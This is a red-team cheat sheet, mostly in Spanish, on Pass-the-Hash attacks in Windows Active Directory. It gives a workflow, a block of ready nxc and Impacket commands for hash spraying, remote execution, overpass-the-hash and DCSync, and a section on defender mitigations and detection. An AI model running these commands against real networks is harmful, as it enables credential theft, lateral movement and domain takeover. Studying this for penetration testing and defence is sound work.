---
aliases:
  - "Pass-the-Hash (PtH)"
  - "Pass-the-Hash Atack"
  - "PassTheHash"
  - "PtH"
  - PtH
  - NTLM Pass-the-Hash
  - Hash Spray
tags:
  - technique/lateral-movement
  - technique/credential-access
  - env/windows
  - asset/active-directory
  - cred/ntlm
primary categories:
  - "[[Red Team]]"
secondary categories:
  - "[[Explotación]]"
  - "[[Active Directory]]"
tertiary categories:
  - "[[Active Directory Explotación]]"
kind: CheatSheet
linked:
  - "[[Pass-the-Hash - Hash Sources y Formats]]"
  - "[[Pass-the-Hash - SMB Lateral]]"
  - "[[Pass-the-Hash - WinRM y RDP]]"
  - "[[Pass-the-Hash - Mimikatz Injection]]"
  - "[[Pass-the-Hash - Overpass-the-Hash y Hash Spray]]"
  - "[[Pass-the-Hash - Tooling]]"
  - "[[Kerberos Pass-the-Ticket]]"
  - "[[LSASS Dumping]]"
  - "[[DCSync]]"
  - "[[netexec]]"
  - "[[Impacket Toolkit]]"
---
# Pass-the-Hash

***

## Cheatsheet

### 🔑 Hash Sources & Formats

````tabs
tab: **Hash Format**
![[Pass-the-Hash - Hash Sources y Formats#^pth-format]]

tab: **LSASS Dump**
![[Pass-the-Hash - Hash Sources y Formats#^pth-lsass]]

tab: **SAM (Local Hashes)**
![[Pass-the-Hash - Hash Sources y Formats#^pth-sam]]

tab: **NTDS.dit Extraction**
![[Pass-the-Hash - Hash Sources y Formats#^pth-ntds]]

tab: **DCSync → Hashes**
![[Pass-the-Hash - Hash Sources y Formats#^pth-dcsync]]

tab: **NetNTLMv2 (no es PtH)**
![[Pass-the-Hash - Hash Sources y Formats#^pth-netntlmv2]]

tab: **Cached Credentials (mscash)**
![[Pass-the-Hash - Hash Sources y Formats#^pth-mscash]]
````

### 🚀 SMB Lateral

````tabs
tab: **netexec / crackmapexec**
![[Pass-the-Hash - SMB Lateral#^pth-smb-nxc]]

tab: **Impacket-PsExec**
![[Pass-the-Hash - SMB Lateral#^pth-smb-psexec]]

tab: **Impacket-WMIExec**
![[Pass-the-Hash - SMB Lateral#^pth-smb-wmiexec]]

tab: **Impacket-SMBExec**
![[Pass-the-Hash - SMB Lateral#^pth-smb-smbexec]]

tab: **Impacket-DComExec**
![[Pass-the-Hash - SMB Lateral#^pth-smb-dcomexec]]

tab: **Impacket-AtExec**
![[Pass-the-Hash - SMB Lateral#^pth-smb-atexec]]

tab: **Method Comparison**
![[Pass-the-Hash - SMB Lateral#^pth-smb-comparison]]

tab: **Pre-PtH Validation**
![[Pass-the-Hash - SMB Lateral#^pth-smb-validate]]
````

### 🖥️ WinRM y RDP

````tabs
tab: **evil-winrm (Linux)**
![[Pass-the-Hash - WinRM y RDP#^pth-winrm-evilwinrm]]

tab: **netexec WinRM**
![[Pass-the-Hash - WinRM y RDP#^pth-winrm-nxc]]

tab: **Impacket-WMIExec (alt)**
![[Pass-the-Hash - WinRM y RDP#^pth-winrm-wmiexec]]

tab: **RDP RestrictedAdmin (PtH)**
![[Pass-the-Hash - WinRM y RDP#^pth-winrm-rdpfreerdp]]

tab: **RestrictedAdmin Status**
![[Pass-the-Hash - WinRM y RDP#^pth-winrm-restrictedadmin]]

tab: **WinRM Permissions Audit**
![[Pass-the-Hash - WinRM y RDP#^pth-winrm-perms]]

tab: **OPSEC Considerations**
![[Pass-the-Hash - WinRM y RDP#^pth-winrm-opsec]]

tab: **Common Errors**
![[Pass-the-Hash - WinRM y RDP#^pth-winrm-errors]]
````

### 💉 Mimikatz Injection

````tabs
tab: **sekurlsa::pth Basic**
![[Pass-the-Hash - Mimikatz Injection#^pth-mimi-basic]]

tab: **Post-Injection Tools**
![[Pass-the-Hash - Mimikatz Injection#^pth-mimi-tools]]

tab: **mimikatz vs Impacket**
![[Pass-the-Hash - Mimikatz Injection#^pth-mimi-comparison]]

tab: **Process Tree / Detection**
![[Pass-the-Hash - Mimikatz Injection#^pth-mimi-detection]]

tab: **Stealth: Process Lineage**
![[Pass-the-Hash - Mimikatz Injection#^pth-mimi-stealth]]

tab: **Cleanup**
![[Pass-the-Hash - Mimikatz Injection#^pth-mimi-cleanup]]

tab: **Common Errors**
![[Pass-the-Hash - Mimikatz Injection#^pth-mimi-errors]]
````

### 🎫 Overpass-the-Hash & Spray

````tabs
tab: **Overpass-the-Hash Concept**
![[Pass-the-Hash - Overpass-the-Hash y Hash Spray#^pth-overpass-concept]]

tab: **Rubeus asktgt (Windows)**
![[Pass-the-Hash - Overpass-the-Hash y Hash Spray#^pth-overpass-rubeus]]

tab: **getTGT.py (Linux)**
![[Pass-the-Hash - Overpass-the-Hash y Hash Spray#^pth-overpass-gettgt]]

tab: **mimikatz Overpass**
![[Pass-the-Hash - Overpass-the-Hash y Hash Spray#^pth-overpass-mimi]]

tab: **Hash Spray (1 hash × N targets)**
![[Pass-the-Hash - Overpass-the-Hash y Hash Spray#^pth-overpass-spray]]

tab: **1 user × N hashes**
![[Pass-the-Hash - Overpass-the-Hash y Hash Spray#^pth-overpass-multihash]]

tab: **Cross-Domain Spray**
![[Pass-the-Hash - Overpass-the-Hash y Hash Spray#^pth-overpass-cross]]

tab: **Spray + Pivoting**
![[Pass-the-Hash - Overpass-the-Hash y Hash Spray#^pth-overpass-pivot]]

tab: **Common Errors**
![[Pass-the-Hash - Overpass-the-Hash y Hash Spray#^pth-overpass-errors]]
````

### 🛠️ Tooling

````tabs
tab: **netexec / crackmapexec**
![[Pass-the-Hash - Tooling#^pth-tool-nxc]]

tab: **Impacket**
![[Pass-the-Hash - Tooling#^pth-tool-impacket]]

tab: **evil-winrm**
![[Pass-the-Hash - Tooling#^pth-tool-evilwinrm]]

tab: **mimikatz**
![[Pass-the-Hash - Tooling#^pth-tool-mimi]]

tab: **Rubeus**
![[Pass-the-Hash - Tooling#^pth-tool-rubeus]]

tab: **pth-suite (Legacy)**
![[Pass-the-Hash - Tooling#^pth-tool-pthsuite]]

tab: **xfreerdp**
![[Pass-the-Hash - Tooling#^pth-tool-xfreerdp]]

tab: **Recursos**
![[Pass-the-Hash - Tooling#^pth-tool-resources]]
````

___

## Overview

**Pass-the-Hash (PtH)** = autenticarse a servicios NTLM-aware usando el **NT hash** del usuario en lugar del password cleartext. Foundational lateral movement technique en Active Directory — Windows NTLM nunca verifica el password real, solo el hash.

**Hash format:** `aad3b435b51404eeaad3b435b51404ee:abc123def456...` (LM:NT). LM siempre blank en domains modernos. Solo NT hash importa (32 hex chars).

**Sources:** LSASS dump (mimikatz), SAM hive (local), NTDS.dit (DCSync / offline), DCSync vía DRSUAPI.

### Cuándo es alto impacto

| **Hash type** | **Impacto** |
|---|---|
| Local Administrator hash + reuse | Hash spray subnet → mass compromise (CVSS Critical). |
| Domain Admin NT hash | Direct DCSync + Golden Ticket (CVSS Critical). |
| Service account NT hash | Lateral + Kerberoast adjacent (CVSS High). |
| User hash (low-priv) | Lateral foothold (CVSS Medium). |
| krbtgt hash | Golden Ticket persistente (CVSS Critical). |

### Diferencia con técnicas adyacentes

| | **PtH** | **Pass-the-Ticket** | **Overpass-the-Hash** |
|---|---|---|---|
| Credential | NT hash | Kerberos TGT/TGS | NT hash → TGT request |
| Auth protocol | NTLM | Kerberos | Kerberos |
| Target accepts | Windows NTLM-aware | Kerberos-aware | Kerberos-aware |
| Detection | NTLM events (4624 type 3) | Less detection | Bypass NTLM detection |

___

## Workflow

```
1. Cred extraction:
   - LSASS dump (mimikatz / comsvcs / nanodump)
   - SAM hive (local Administrator hash)
   - DCSync (forest-wide hashes)
   - NTDS.dit offline (Backup Operators)

2. Hash format identification:
   - Full LM:NT vs NT only
   - NT hash = 32 hex chars

3. Pre-attack validation:
   - nxc smb <target> -u user -H <NT> (validate auth)
   - Check share access, sessions, etc.

4. Method selection:
   a. SMB lateral (psexec/wmiexec/smbexec/dcomexec)
   b. WinRM (evil-winrm)
   c. RDP RestrictedAdmin (xfreerdp /pth)
   d. Mimikatz injection (on-host Windows)
   e. Overpass-the-Hash (Rubeus / getTGT)

5. Hash reuse exploitation:
   - Local admin hash spray sobre subnet
   - Domain user hash → multi-host access

6. Privesc chain:
   - Local hash → LSASS dump más users
   - Domain user → DCSync → krbtgt
   - krbtgt → Golden Ticket persistence

7. Cleanup:
   - klist purge
   - Close injected processes
```

___

## Detección rápida

```bash
# 1. Validate hash + auth
NT="aabbccdd1122334455..."
nxc smb 10.10.10.5 -u atacante -H $NT

# 2. Hash reuse subnet sweep
nxc smb 10.10.10.0/24 -u administrator -H $NT --local-auth | grep "Pwn3d"

# 3. Lateral RCE
impacket-wmiexec -hashes :$NT corp.local/atacante@10.10.10.5

# 4. Overpass-the-Hash → TGT
impacket-getTGT corp.local/atacante -hashes :$NT -dc-ip 10.10.10.10
export KRB5CCNAME=atacante.ccache

# 5. DCSync con hash
impacket-secretsdump corp.local/atacante@10.10.10.10 -hashes :$NT -just-dc
```

___

## Impacto

- **Local admin hash reuse** — most common privesc → mass compromise.
- **Domain user PtH** — lateral foothold + recon authenticated.
- **Service account hash** — kerberoast adjacent + lateral via SPNs.
- **Domain Admin hash** — DCSync → krbtgt → Golden Ticket.
- **krbtgt hash** — domain takeover persistente.
- **Computer account hash** — lateral via computer account auth (RBCD adjacent).
- **gMSA hash** — service identity + cross-host lateral.
- **Backup Operators member hash** — NTDS.dit dump path.
- **Trust account hash** — cross-trust forge (inter-realm TGT).

___

## Mitigación (defender)

- **LAPS / LAPSv2** — local admin pwd único por host → hash spray rompe.
- **Protected Users group** — desactiva NTLM auth para members + 4h TGT lifetime.
- **Credential Guard** (VBS) — VSM aísla LSASS, hash dump bloqueado.
- **Restricted Admin RDP** — no deja creds en memoria post-RDP.
- **Disable NTLM** o `Restrict NTLM in this domain` GPO — kill NTLM-only targets.
- **Tier model (T0/T1/T2)** — DA never logon en workstations.
- **WDigest disable** — no cleartext en LSASS (default Win 8.1+).
- **Detection events**:
  - `Event 4624 logon type 3` con `Authentication Package: NTLM` desde host inesperado.
  - `Event 4776` en DC con error `0xC000006A` (bad password) en bulk = brute.
  - Sysmon Event 10 (LSASS access) → mimikatz detection.
- **MDI alerts**:
  - `Suspected identity theft (pass-the-hash)`
  - `Suspicious authentication failures (Honeytoken activity)`
- **PingCastle audit** rule `S-PwdLastSet-Reversible` + `T1-Pth` indicators.

___

## Para entender PtH

**Por qué NTLM es vulnerable:** NTLM challenge-response usa el **NT hash directamente** como key para HMAC. No hay "password" en el wire — solo derivación criptográfica del hash. Server compara HMAC esperado con HMAC recibido. Si tenés hash, calculás HMAC = autenticación válida sin saber password.

**Por qué LM hash es legacy:** LM (LAN Manager) hash divide password en 2 chunks de 7 chars + uppercase + DES = trivial crack. Disabled default Win Vista+. `aad3b435b51404eeaad3b435b51404ee` = LM hash de string vacío.

**Por qué Overpass-the-Hash existe:** Kerberos auth en domains modernos. NTLM auth = anomalía → MDI alerts. Overpass = NT hash → request TGT → use TGT = looks like normal Kerberos auth = bypass NTLM detection.

**Por qué Restricted Admin RDP no protege contra PtH 100%:** RestrictedAdmin RDP **previene cred theft hacia el target** (no envía password al RDP server). PERO **acepta hash via /pth** = atacante con hash entra. Solo proteje target server, no source attack.

**Por qué Credential Guard rompe PtH local:** Credential Guard mueve LSASS secrets a Virtual Secure Mode (VSM) — proceso aislado por hypervisor. mimikatz no puede leer hashes. Disabled default fuera de Windows Enterprise + UEFI Secure Boot.

**Por qué LAPS mata hash spray:** LAPS rota password local Administrator únicamente per host. Hash de Host A ≠ hash de Host B. Hash spray entre hosts no funciona.

**Por qué Protected Users es el hardening fuerte:** miembros del group:
- NTLM auth disabled (forced Kerberos).
- AES required (no RC4).
- TGT lifetime 4h (no 10h default).
- No delegation (TGT/cached creds removed post-logoff).

Tier 0 admins en Protected Users = inmunes a PtH/Overpass/Kerberoast clásico.

___

## Recursos

- [Microsoft - Mitigating Pass-the-Hash and Other Credential Theft v2](https://www.microsoft.com/download/details.aspx?id=36036)
- [HackTricks - Pass the Hash](https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/pass-the-hash) — comprehensive.
- [The Hacker Recipes - PtH](https://www.thehacker.recipes/ad/movement/ntlm/pth) — reference.
- [Impacket repo](https://github.com/fortra/impacket) — tools.
- [Rubeus](https://github.com/GhostPack/Rubeus) — Kerberos toolkit.
- [Mimikatz](https://github.com/gentilkiwi/mimikatz) — cred toolkit.
- [evil-winrm](https://github.com/Hackplayers/evil-winrm) — WinRM client.
- [netexec docs](https://www.netexec.wiki) — multi-protocol.
- [SpecterOps - Credential Theft Shuffle](https://posts.specterops.io/an-introduction-to-manipulating-and-attacking-active-directory-credential-theft-shuffle-c4dad77f4daa) — analysis.
- [MITRE ATT&CK T1550.002](https://attack.mitre.org/techniques/T1550/002/) — Pass the Hash.
- [MITRE ATT&CK T1003](https://attack.mitre.org/techniques/T1003/) — OS Credential Dumping (sources).

***
